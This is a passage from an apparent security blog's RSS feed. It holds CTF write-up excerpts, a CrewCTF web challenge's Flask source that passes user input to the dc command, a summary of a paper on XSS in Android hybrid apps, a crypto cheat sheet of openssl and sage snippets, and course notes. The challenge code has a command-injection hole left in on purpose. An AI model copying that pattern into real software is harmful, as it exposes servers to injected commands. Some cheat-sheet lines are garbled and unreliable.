&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">if&lt;/span> ( byte_4200E0[strlen(byte_4200E0) &lt;span style="color:#f92672">-&lt;/span> &lt;span style="color:#ae81ff">1&lt;/span>] &lt;span style="color:#f92672">==&lt;/span> &lt;span style="color:#ae81ff">10&lt;/span> )
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> byte_4200E0[strlen(byte_4200E0) &lt;span style="color:#f92672">-&lt;/span> &lt;span style="color:#ae81ff">1&lt;/span>] &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span>;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">for&lt;/span> ( i &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span>; i &lt;span style="color:#f92672">&amp;lt;=&lt;/span> &lt;span style="color:#ae81ff">73&lt;/span>; &lt;span style="color:#f92672">++&lt;/span>i )
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">if&lt;/span> ( byte_4200E0[i] &lt;span style="color:#f92672">!=&lt;/span> (byte_420060[i] &lt;span style="color:#f92672">^&lt;/span> &lt;span style="color:#ae81ff">0x70&lt;/span>) )
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> sub_401220();
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> sub_401202();
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>}
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>:::&lt;/p>
&lt;h2 id="recon">
 Recon
 &lt;a class="anchor" href="#recon">#&lt;/a>
&lt;/h2>
&lt;p>首先這一題真的太難了，超出我的守備範圍，所以我先寫一些當作紀錄，之後可以更快銜接繼續解&lt;/p>
&lt;ol>
&lt;li>
&lt;p>首先可以執行一下，如果是在Ubuntu 20.04(預設Libc版本是2.31)的版本和其他版本會有不一樣的output&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>$ ldd --version
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>ldd &lt;span style="color:#f92672">(&lt;/span>Ubuntu GLIBC 2.31-0ubuntu9.9&lt;span style="color:#f92672">)&lt;/span> 2.31
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Copyright &lt;span style="color:#f92672">(&lt;/span>C&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#ae81ff">2020&lt;/span> Free Software Foundation, Inc.
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>This is free software; see the source &lt;span style="color:#66d9ef">for&lt;/span> copying conditions. There is NO
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>warranty; not even &lt;span style="color:#66d9ef">for&lt;/span> MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Written by Roland McGrath and Ulrich Drepper.
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>$ ./a.out
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">[&lt;/span>+&lt;span style="color:#f92672">]&lt;/span> Another flag checker...
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#ae81ff">123456&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">[&lt;/span>-&lt;span style="color:#f92672">]&lt;/span> No :&lt;span style="color:#f92672">(&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>$ ldd --version
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>ldd &lt;span style="color:#f92672">(&lt;/span>Ubuntu GLIBC 2.35-0ubuntu3&lt;span style="color:#f92672">)&lt;/span> 2.35
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Copyright &lt;span style="color:#f92672">(&lt;/span>C&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#ae81ff">2022&lt;/span> Free Software Foundation, Inc.
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>This is free software; see the source &lt;span style="color:#66d9ef">for&lt;/span> copying conditions. There is NO
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>warranty; not even &lt;span style="color:#66d9ef">for&lt;/span> MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Written by Roland McGrath and Ulrich Drepper.
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>./a.out
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">[&lt;/span>+&lt;span style="color:#f92672">]&lt;/span> Another flag checker...
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#ae81ff">123456&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">[&lt;/span>-&lt;span style="color:#f92672">]&lt;/span> Why you still here
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>這是因為他和這隻程式執行的過程有關係&lt;/p></description></item><item><title>CrewCTF - sequence_gallery</title><link>https://bernie6401.github.io/docs/security/practice/crewctf/web/crewctf---sequence_gallery/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/security/practice/crewctf/web/crewctf---sequence_gallery/</guid><description>&lt;h1 id="crewctf---sequence_gallery">
 CrewCTF - sequence_gallery
 &lt;a class="anchor" href="#crewctf---sequence_gallery">#&lt;/a>
&lt;/h1>
&lt;h2 id="background">
 Background
 &lt;a class="anchor" href="#background">#&lt;/a>
&lt;/h2>
&lt;p>&lt;a href="https://lab.feifei.tw/practice/ci/l1.php">Command Injection&lt;/a>
&lt;a href="https://www.geeksforgeeks.org/dc-command-in-linux-with-examples/">dc command in Linux with examples&lt;/a>
&lt;a href="https://deepinout.com/linux-cmd/linux-numerical-computation-cmd/linux-cmd-dc.html">Linux dc命令&lt;/a>&lt;/p>
&lt;blockquote>
&lt;p>dc -h
Usage: dc [OPTION] [file &amp;hellip;]
-e, &amp;ndash;expression=EXPR evaluate expression
-f, &amp;ndash;file=FILE evaluate contents of file
-h, &amp;ndash;help display this help and exit
-V, &amp;ndash;version output version information and exit&lt;/p>
&lt;p>Email bug reports to: &lt;a href="mailto:bug-dc@gnu.org">bug-dc@gnu.org&lt;/a> .&lt;/p>&lt;/blockquote>
&lt;h2 id="source-code">
 Source Code
 &lt;a class="anchor" href="#source-code">#&lt;/a>
&lt;/h2>
&lt;p>:::spoiler Source Code&lt;/p>
&lt;pre tabindex="0">&lt;code class="language-python!" data-lang="python!">import os
import sqlite3
import subprocess

from flask import Flask, request, render_template

app = Flask(__name__)

@app.get(&amp;#39;/&amp;#39;)
def index():
	sequence = request.args.get(&amp;#39;sequence&amp;#39;, None)
	if sequence is None:
		return render_template(&amp;#39;index.html&amp;#39;)

	script_file = os.path.basename(sequence + &amp;#39;.dc&amp;#39;)
	if &amp;#39; &amp;#39; in script_file or &amp;#39;flag&amp;#39; in script_file:
		return &amp;#39;:(&amp;#39;

	proc = subprocess.run(
		[&amp;#39;dc&amp;#39;, script_file], 
		capture_output=True,
		text=True,
		timeout=1,
	)
	output = proc.stdout

	return render_template(&amp;#39;index.html&amp;#39;, output=output)

if __name__ == &amp;#39;__main__&amp;#39;:
	app.run(host=&amp;#39;0.0.0.0&amp;#39;, port=8080)
&lt;/code>&lt;/pre>&lt;p>:::&lt;/p></description></item><item><title>Cross-site Scripting Attacks on Android Hybrid Applications</title><link>https://bernie6401.github.io/docs/survey-papers/android-+-security/cross-site-scripting-attacks-on-android-hybrid-applications/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/survey-papers/android-+-security/cross-site-scripting-attacks-on-android-hybrid-applications/</guid><description>&lt;h1 id="cross-site-scripting-attacks-on-android-hybrid-applications">
 Cross-site Scripting Attacks on Android Hybrid Applications
 &lt;a class="anchor" href="#cross-site-scripting-attacks-on-android-hybrid-applications">#&lt;/a>
&lt;/h1>
&lt;p>:::info
Bao, W., Yao, W., Zong, M., &amp;amp; Wang, D. (2017, March). Cross-site scripting attacks on android hybrid applications. In Proceedings of the 2017 International Conference on Cryptography, Security and Privacy (pp. 56-61).
:::&lt;/p>
&lt;p>這一篇論文雖然很舊了，但還是蠻有趣的&lt;/p>
&lt;h2 id="introduction">
 Introduction
 &lt;a class="anchor" href="#introduction">#&lt;/a>
&lt;/h2>
&lt;p>他在講的是現在市面上的App通常會用一些像是Apache Cordova(早期叫做PhoneGap)這類型的Hybrid框架製作一款App，但是PhoneGap的做法是利用WebView渲染畫面，因此就勢必會出現XSS相關的攻擊，這一篇論文就是在探討如何達成攻擊，以及受害範圍有多廣&lt;/p>
&lt;ul>
&lt;li>Gartner 的一份報告稱，Hybrid App在基於 HTML5 的 Web App和本機 App之間提供了平衡，到 2016 年，將在超過 50% 的行動 App中使用&lt;/li>
&lt;li>為了美化 UI 並在 JavaScript 程式碼中使用行動裝置的原生功能，Hybrid App必須包含第三方元件，而且它們的程式碼可能不可靠。&lt;/li>
&lt;li>在本文的其餘部分，我們首先對WebView和PhoneGap框架的漏洞進行深入分析。 然後根據我們日常生活中行動應用的使用場景，建立了XSS攻擊混合應用的一般流程。 攻擊結果表明，對Hybrid App的 XSS 攻擊可能會對使用者的行動裝置造成更大的破壞性結果。&lt;/li>
&lt;/ul>
&lt;h2 id="background">
 Background
 &lt;a class="anchor" href="#background">#&lt;/a>
&lt;/h2>
&lt;ul>
&lt;li>What is PhoneGap?
&lt;img src="https://hackmd.io/_uploads/rJsdoZWX0.png" alt="圖片" />
上圖顯示了PhoneGap App的架構以及如何和device component互動，當Hybrid App的某個功能需要使用 PhoneGap API 時， App可以使用 JavaScript 程式碼呼叫 API，然後 App中的特殊層將 PhoneGap API 呼叫轉換為適合幕後特定功能的device API。&lt;/li>
&lt;/ul>
&lt;h2 id="proposed-method">
 Proposed Method
 &lt;a class="anchor" href="#proposed-method">#&lt;/a>
&lt;/h2>
&lt;ul>
&lt;li>How XSS attack success on PhoneGap&amp;rsquo;s App?
&lt;img src="https://hackmd.io/_uploads/SyPtsW-7R.png" alt="圖片" />
有兩種方是可以達成這個攻擊
&lt;ul>
&lt;li>首先從上圖可以知道，外部的資料有很多種型態，可能是一般文字、QRcode、藍牙等等媒介，而當傳送的資料出現malicious code的時候，PhoneGap Interface的App就會接收這些有問題的資料，並且直接被WebView所render，此時attacker就可以直接根據傳送的payload達到竊取機敏資料的目的
&lt;blockquote>
&lt;p>在使用者的幫助下注入程式碼。 當使用者開啟將行動裝置連接到外界的通道時，將提供存取權限以允許來自另一個裝置的攻擊。 惡意程式碼是透過在不知不覺中與另一個裝置互動來注入的，然後按照與第一個裝置類似的流程來實現攻擊。&lt;/p></description></item><item><title>Crypto Cheat Sheet</title><link>https://bernie6401.github.io/docs/tools/ctf/crypto-cheat-sheet/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/tools/ctf/crypto-cheat-sheet/</guid><description>&lt;h1 id="crypto-cheat-sheet">
 Crypto Cheat Sheet
 &lt;a class="anchor" href="#crypto-cheat-sheet">#&lt;/a>
&lt;/h1>
&lt;h2 id="online-tools---classic-crypto">
 Online Tools - Classic Crypto
 &lt;a class="anchor" href="#online-tools---classic-crypto">#&lt;/a>
&lt;/h2>
&lt;table>
 &lt;thead>
 &lt;tr>
 &lt;th>Complex&lt;/th>
 &lt;th>Substitution Cipher&lt;/th>
 &lt;th>Vigenère Cipher&lt;/th>
 &lt;/tr>
 &lt;/thead>
 &lt;tbody>
 &lt;tr>
 &lt;td>&lt;a href="https://gchq.github.io/CyberChef/">CyberChef&lt;/a>&lt;/td>
 &lt;td>&lt;a href="https://www.boxentriq.com/code-breaking/cryptogram">Substitution Cipher Solver Tool&lt;/a>&lt;/td>
 &lt;td>Known Key &lt;/br>Python - &lt;code>pycipher&lt;/code> library&lt;/br>&lt;a href="https://planetcalc.com/2468/">online - Vigenère cipher&lt;/a>&lt;/br>CAP4&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td>&lt;a href="https://quipqiup.com/">quipqiup&lt;/a>&lt;/td>
 &lt;td>&lt;/td>
 &lt;td>Unknown Key&lt;/br>&lt;a href="https://www.mygeocachingprofile.com/codebreaker.vigenerecipher.aspx">Vigenère Cipher Codebreaker&lt;/a>&lt;/br>&lt;a href="https://www.guballa.de/vigenere-solver">Vigenere Solver&lt;/a>&lt;/td>
 &lt;/tr>
 &lt;/tbody>
&lt;/table>
&lt;h2 id="rsa相關攻擊">
 RSA相關攻擊
 &lt;a class="anchor" href="#rsa%e7%9b%b8%e9%97%9c%e6%94%bb%e6%93%8a">#&lt;/a>
&lt;/h2>
&lt;p>其實整裡的文章內容都差不多&lt;/p>
&lt;ul>
&lt;li>&lt;a href="https://www.anquanke.com/post/id/84632">【技術分享】CTF中RSA的常見攻擊方法&lt;/a>&lt;/li>
&lt;li>&lt;a href="https://ctf-wiki.org/crypto/asymmetric/rsa/rsa_module_attack/">Mod相關攻擊&lt;/a>&lt;/li>
&lt;li>&lt;a href="https://zhuanlan.zhihu.com/p/76228394">CTF RSA&lt;/a>&lt;/li>
&lt;/ul>
&lt;h2 id="coding-tools">
 Coding Tools
 &lt;a class="anchor" href="#coding-tools">#&lt;/a>
&lt;/h2>
&lt;ul>
&lt;li>大數運算: &lt;a href="https://blog.csdn.net/m0_52842062/article/details/117852175">gmpy2&lt;/a>/&lt;a href="https://cocalc.com/features/sage">sage math online - cocalc&lt;/a>/&lt;a href="https://sagecell.sagemath.org/">sage math online - sagecell&lt;/a>/&lt;a href="https://www.wolframalpha.com/">WolframAlpha&lt;/a>:這是一個線上的搜索引擎，但凡和數學相關的都能進行運算，使用解說可以看&lt;a href="https://youtu.be/9JD3EzbAjH4?si=fmL7rOXK0u__Mf3u">這裡&lt;/a>
&lt;pre tabindex="0">&lt;code class="language-bash!" data-lang="bash!">$ sudo apt install sagemath
# or
$ conda create --name sageenv sage=10.0 -c conda-forge -y # just only for wsl
---
# 想要在sage中安裝python library
$ sage -pip install {library name}
&lt;/code>&lt;/pre>:::spoiler To address Discrete Log Problem
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-python" data-lang="python">&lt;span style="display:flex;">&lt;span>p &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">117635180960139721127318189832610714114593440637486157582828661167364276581210599344857316369131977790468647533227778603367761815400416396281259234299247850289710613080530669849409358755399675041263469367135430665518150110493389671646158566214130516002949975036799297119111385228596853422400303735447298026283&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>q &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">163800729847029979711295941089800020300275211671661376396219775666688832353701752860857691086339595920419175562271802936423756228938551439950541873798393442729921516031775531740506399414675546114663346731428381174638773512946351966471041847661507898143967764453261943807056370639171597924004988320983393199599&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>c &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">0x8788542cefd7490c9282c06b8d24280d56c6706b996bdf580290cdf2cb90e45efd2ce185fc07d2b916c24b0512d38ca14de0ee608a9d6003f258859bbbed97dad15c1d07410a34fd55cd8305eb43418d38f1ca6e024725b97fd9da701a39c23fe55a13d43b4bf9a3d9ebb44d7fe67bd60beffc29ec27bb4baf05ec5b250bfa68360df0d1379c066297a7878e59d27e68cf6a0da90755450827623e54e4f3d9f280fef53c7620d58decfbd10dd64e9d1d5507b5460603c58f5be70c82e2a8e613d730a950caea4c4389c5fc0521f8207ead5fb26c04eb6d0486fd6fe8d015fdabbda00139b42163acc86ffb30c12988058c6247344c42b8f3cdc984c06f4276f8&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>g &lt;span style="color:#f92672">=&lt;/span> Mod(&lt;span style="color:#ae81ff">3&lt;/span>,p)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>m &lt;span style="color:#f92672">=&lt;/span> discrete_log(c,g)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>print(hex(m))
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>g2 &lt;span style="color:#f92672">=&lt;/span> Mod(&lt;span style="color:#ae81ff">3&lt;/span>,q)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>m2 &lt;span style="color:#f92672">=&lt;/span> discrete_log(c,g2)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>print(m2)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>print(hex(m2)[&lt;span style="color:#ae81ff">2&lt;/span>:])
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>:::&lt;/li>
&lt;li>Crypto常用library: pycryptodom
&lt;code>$ pip install pycryptodome&lt;/code>
:::spoiler pycryptodome generate PEM file
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>&amp;gt;&amp;gt;&amp;gt; from Crypto.PublicKey import RSA
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&amp;gt;&amp;gt;&amp;gt; n &lt;span style="color:#f92672">=&lt;/span> 0xb4f98200f1309e8a486824051051ac80790f8e66dac4744e2ce5134fb432121f41c5471e3459d01e56e64befd2034c65eb300ebf0045342221bff206b6cdda7f3349c17b08563a576731f95a64e2f00af70b5cbb2f4f388d49ce82da76ca609a6ec1529f29b0fa0bedc5764b86472e2c5ac5198cedb6f5e1e8e0ca950ea11bc4cf5e5a0497db3ad96f5a745cf902d56be394a259068fe198bc9de8fe8d034a71013f46c2ac72451211eb1127286c19467eaf3a10049942d46b0f49f3c51c01c06a2f8c94416cc1aadaeb191de959f0241ce8f32575c848bd2f4f8f84dab46e2aa7ad45de1c6060fbbee9668f8e9cb6d366b8cd6ce99f78bbef145f2b7b7e5222f762ccb95f17b1538260c2ea45571061b0d873fbe60d61dd87aa4833ac71b802f2b91d30f38e30ae9da39fbd1c53e80496f511521285b3bb1da3dc79931463d278d1fe28a77880a9f2368029c4cefffebbbd6904f85291b3606d0b5ed3efd8c1ee14538dc051274665f4b0f55d6c6e12d2cb728ac15f7a6572b71a5bd6fa01bddb0af211091bff4c8ec7e93efae4654b2abae09e35be29afbfc3f4df8e4348c525b9d8662a1ac344dadb15b953905f639b48fec7cfcfdf27cc0ad82b936d5efe7c0d891bf9752d3fb0857d38337df033e4b681d19ec8603535504d05a421036c077694482eee919a44b3296e2a4c272cbf7bbf14b6d62eb194e4ee83ba227fed
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&amp;gt;&amp;gt;&amp;gt; e &lt;span style="color:#f92672">=&lt;/span> 0x10001
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&amp;gt;&amp;gt;&amp;gt; d &lt;span style="color:#f92672">=&lt;/span> 0x737efcd1df1b7942a53d1927c62769a0c022066e6bd58ea8498c948b7c63ac1f18996f6ebe584732e5a0a9fbce9ade49f913bd857605b464c80738cdc22293fc33de314574a79b2a26a8c50b447174627b115c47f5c46841fb45794b351ea91245f6c8e4dcf59e4eb89b1988cf9463ca58cf8b23de9db2444f9c0e8d9c3d837c521f53f1b47c6c0d523c7720d2a655503a78a4378eb18a773080d2ae898dfd172b8597822c0ded38c008b5f4b89e6c6f09f0886caa92a90ce99a6346d897ac2281620124a8b060d4ca4bd9c6b622f8d8033f43d5b75a6fd994f50091f805c87d1e6fbdb42785f6bf1332df8a64a86d21736023720b9303b964b62a9a9480a4a7ab5fac794f583109d5663998ccc893590ebe26ae076e17c2b93c2238106612094fd4c6a56ec84ca5fa6ee3608ba3422f931828772e6732c337fcd6d4e6cb4a907d2e978227423d783c112f7a7d3e6d7c91ac7c540f0095d39842a6be534321a67d7a3fcb1c62c0f9e8a6d6e10281e10ff957449770d19f939153692c73f940450eab03f58ef55d2adf98c3f8479d05bb02997667381d3583c8f0eba6ea91bce512b001a27788309a4aa15952c73572a329b2f3acd6a11f43e3ae00532ccfbe9f157702162b534d26ca1e668d4cdbfd0116b7cb724603ea99e8aa08c90410534dd681b59350542c59523cb1259428e05e1fe0aab479c4b5af2a44d18ef713cd61
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&amp;gt;&amp;gt;&amp;gt; p &lt;span style="color:#f92672">=&lt;/span> 0xd73e2ef8f2e4f1de44ee80070beef39943d4fa89a7a7ab4b0061e851aca7deb4f717f2baf4a0c018f3dcdab92148596bc50800fd6eb2f2e7757e0343534aea2241f0a2d34795a08f8e5ccc7959184b9cf8e3007a8ad63acd7d4b350dbf2d4caf04f4bc98d74a3b01d3b1aced745133186fd8460a2dff536a74ee4d041c988d5743cc9355144f48fe5f52db0449a46ba7c15c04001a5cb141796b5b42d9d72c36cca6d6bb8f177aee1699a47ba5d87c7ee886467af18403dbd84e102a952ebee03cc70bcf072c26b1b1f0f5094be08470c6c1769b417feffd5c89a0c373f75a350d177309618bfeb16316c660c6b2a341a984c8845081ede7c42e22cc9272aa15
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&amp;gt;&amp;gt;&amp;gt; q &lt;span style="color:#f92672">=&lt;/span> 0xd73e2ef8f2e4f1de44ee80070beef39943d4fa89a7a7ab4b0061e851aca7deb4f717f2baf4a0c018f3dcdab92148596bc50800fd6eb2f2e7757e0343534aea2241f0a2d34795a08f8e5ccc7959184b9cf8e3007a8ad63acd7d4b350dbf2d4caf04f4bc98d74a3b01d3b1aced745133186fd8460a2dff536a74ee4d041c988d5743cc9355144f48fe5f52db0449a46ba7c15c04001a5cb141796b5b42d9d72c36cca6d6bb8f177aee1699a47ba5d87c7ee886467af18403dbd84e102a952ebee03cc70bcf072c26b1b1f0f5094be08470c6c1769b417feffd5c89a0c373f75a350d177309618bfeb16316c660c6b2a341a984c8845081eded2ff580f9f582ac79
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&amp;gt;&amp;gt;&amp;gt; key_params &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#f92672">(&lt;/span>n, e, d, p, q&lt;span style="color:#f92672">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&amp;gt;&amp;gt;&amp;gt; key &lt;span style="color:#f92672">=&lt;/span> RSA.construct&lt;span style="color:#f92672">(&lt;/span>key_params&lt;span style="color:#f92672">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&amp;gt;&amp;gt;&amp;gt; f &lt;span style="color:#f92672">=&lt;/span> open&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#e6db74">&amp;#39;./rsaprivatekey.pem&amp;#39;&lt;/span>, &lt;span style="color:#e6db74">&amp;#39;w&amp;#39;&lt;/span>&lt;span style="color:#f92672">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&amp;gt;&amp;gt;&amp;gt; f.write&lt;span style="color:#f92672">(&lt;/span>key.exportKey&lt;span style="color:#f92672">()&lt;/span>.decode&lt;span style="color:#f92672">())&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&amp;gt;&amp;gt;&amp;gt; f.close&lt;span style="color:#f92672">()&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>:::&lt;/li>
&lt;li>&lt;a href="https://www.mkssoftware.com/docs/man1/openssl_rsa.1.asp">openssl - RSA(很清楚)&lt;/a>
:::spoiler Cheat Sheet
&lt;pre tabindex="0">&lt;code class="language-bash!" data-lang="bash!">&amp;#39;&amp;#39;&amp;#39;AES / DES&amp;#39;&amp;#39;&amp;#39;
$ openssl des-ecb –e –in xxx.txt –out yyy.out –k password (DES encrypt)
$ openssl des-ecb –d –in yyy.out –out xxx.txt –k password (DES decrypt)
$ openssl des-ede3 –d –in yyy.out –out xxx.txt –k password (TDES encrypt)
$ openssl aes-128-ecb –d –in yyy.out –out xxx.txt –k password (AES decrypt)

&amp;#39;&amp;#39;&amp;#39;RSA&amp;#39;&amp;#39;&amp;#39;
$ openssl genrsa –out rsa_privatekey.pem –passout pass:password –des3 1024
# (generate RSA private key)
$ openssl rsa –in rsa_privatekey.pem –passin pass:password –pubout –out
rsa_publickey.pem (generate RSA public key)
$ openssl rsautl –encrypt –pubin –inkey rsa_publickey.pem –in xxx.txt –out yyy.txt
# (use public key to encrpt)
$ openssl rsaut –decrypt –ik i k n ey rsa_privatekey.pem –in yyy.txt –out xxx.txt

# To print out the components of a private key to standard output
$ openssl rsa -in key.pem -text -noout

# 把certificate轉成pem file
$ openssl openssl x509 -in cert -pubkey -noout
-----BEGIN PUBLIC KEY-----
MCIwDQYJKoZIhvcNAQEBBQADEQAwDgIHEaTUUhKxfwIDAQAB
-----END PUBLIC KEY-----

# 把單純public key的內容(n, e)(就是上面的東西)印出來
$ openssl rsa -pubin -in public.pem -text
RSA Public-Key: (53 bit)
Modulus: 4966306421059967 (0x11a4d45212b17f)
Exponent: 65537 (0x10001)
writing RSA key
-----BEGIN PUBLIC KEY-----
MCIwDQYJKoZIhvcNAQEBBQADEQAwDgIHEaTUUhKxfwIDAQAB
-----END PUBLIC KEY-----

// 產出私鑰
openssl genrsa -out key.pem 2048

// 用同一把私鑰，產出兩組不同的憑證
openssl req -x509 -new -key key.pem -sha256 -nodes -keyout key.pem -out cert1.pem -days 30
openssl req -x509 -new -key key.pem -sha256 -nodes -keyout key.pem -out cert2.pem -days 30

// 顯示公鑰是一樣
openssl x509 -pubkey -noout -in cert1.pem
openssl x509 -pubkey -noout -in cert2.pem

// 顯示憑證內容是不一樣
openssl x509 -inform pem -in cert2.pem
openssl x509 -inform pem -in cert1.pem
&lt;/code>&lt;/pre>:::&lt;/li>
&lt;/ul>
&lt;h2 id="factoring-tools">
 Factoring Tools
 &lt;a class="anchor" href="#factoring-tools">#&lt;/a>
&lt;/h2>
&lt;ul>
&lt;li>&lt;a href="http://factordb.com/index.php">Factor DB&lt;/a>&lt;/li>
&lt;li>&lt;a href="https://github.com/DarkenCode/yafu">Yafu&lt;/a>&lt;/li>
&lt;li>&lt;a href="https://www.alpertron.com/ECM.HTM">Prime Factorization Online&lt;/a>&lt;/li>
&lt;/ul></description></item><item><title>Cryptography and Network Security - Final Project</title><link>https://bernie6401.github.io/docs/security/course/ntu-cns/cryptography-and-network-security---final-project/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/security/course/ntu-cns/cryptography-and-network-security---final-project/</guid><description>&lt;h1 id="cryptography-and-network-security---final-project">
 Cryptography and Network Security - Final Project
 &lt;a class="anchor" href="#cryptography-and-network-security---final-project">#&lt;/a>
&lt;/h1>
&lt;h2 id="threshold-he-description">
 Threshold HE Description
 &lt;a class="anchor" href="#threshold-he-description">#&lt;/a>
&lt;/h2>
&lt;p>With a designed scheme in place for threshold homomorphic encryption, private keys are divided into various shares among participating individuals who then work together to collaborate on computations without revealing plaintext material.&lt;/p>
&lt;p>Decryption requires collaboration from at least the minimum requirement, e.g. $(t,n)$ means there&amp;rsquo;re $n$ participate parties but need at least $t$ parties&amp;rsquo; granting to decrypt the secret just like secret sharing scheme proposed by Shamir. Threshold homomorphic&amp;rsquo;s primary objective is secure computation involving confidential information with lesser exposure or accessibility risks for single individuals - due to a shared understanding by several stakeholders.&lt;/p></description></item><item><title>Cryptography and Network Security - Regular Critique 2</title><link>https://bernie6401.github.io/docs/security/course/ntu-cns/paper-critique/cryptography-and-network-security---regular-critique-2/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/security/course/ntu-cns/paper-critique/cryptography-and-network-security---regular-critique-2/</guid><description>&lt;h1 id="cryptography-and-network-security---regular-critique-2">
 Cryptography and Network Security - Regular Critique 2
 &lt;a class="anchor" href="#cryptography-and-network-security---regular-critique-2">#&lt;/a>
&lt;/h1>
&lt;p>&lt;a href="https://hackmd.io/TNJhiAf4TIOgpgTzEjELKA">&lt;img src="https://hackmd.io/TNJhiAf4TIOgpgTzEjELKA/badge" alt="hackmd-github-sync-badge" />&lt;/a>&lt;/p>
&lt;h2 id="reading-topic-a-key-management-scheme-for-distributed-sensor-networks">
 Reading Topic: A key-management scheme for distributed sensor networks
 &lt;a class="anchor" href="#reading-topic-a-key-management-scheme-for-distributed-sensor-networks">#&lt;/a>
&lt;/h2>
&lt;h6 id="tags-ntucns">
 tags: &lt;code>NTUCNS&lt;/code>
 &lt;a class="anchor" href="#tags-ntucns">#&lt;/a>
&lt;/h6>
&lt;p>Name: 何秉學	Student ID: R11921A16&lt;/p>
&lt;h2 id="summary">
 Summary
 &lt;a class="anchor" href="#summary">#&lt;/a>
&lt;/h2>
